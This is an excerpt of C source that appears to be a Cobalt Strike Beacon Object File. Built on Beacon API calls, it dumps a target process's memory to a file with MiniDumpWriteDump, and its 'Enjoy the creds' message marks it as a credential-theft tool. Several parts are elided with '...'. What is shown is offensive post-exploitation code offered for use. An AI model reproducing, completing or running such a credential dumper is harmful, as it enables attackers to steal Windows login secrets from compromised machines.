...
static  unsigned        dump_system_info(struct dump_context* dc)
{
    ...
    BeaconPrintf(CALLBACK_OUTPUT, "OS Version: %d.%d.%d", dwMajor, dwMinor, dwBuildNumber);
    FreeLibrary(hinst);
...
void go(char* args, int length) {
	...
	HANDLE hFile = KERNEL32$CreateFileA(output_file, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	if (!hFile)
	{
		BeaconPrintf(CALLBACK_OUTPUT, "Failed to write dump: Invalid dump file path.");
	}
	else
	{
		BOOL Result = MiniDumpWriteDumpA(hProc,
				KERNEL32$GetProcessId(hProc),
				hFile
				);
		...
		if (!Result)
		{
			BeaconPrintf(CALLBACK_OUTPUT, "Looks like an error: MiniDumpWriteDump failed.");
		} else {		
			BeaconPrintf(CALLBACK_OUTPUT, "Done! Enjoy the creds. (%s)", output_file);
		}
	}
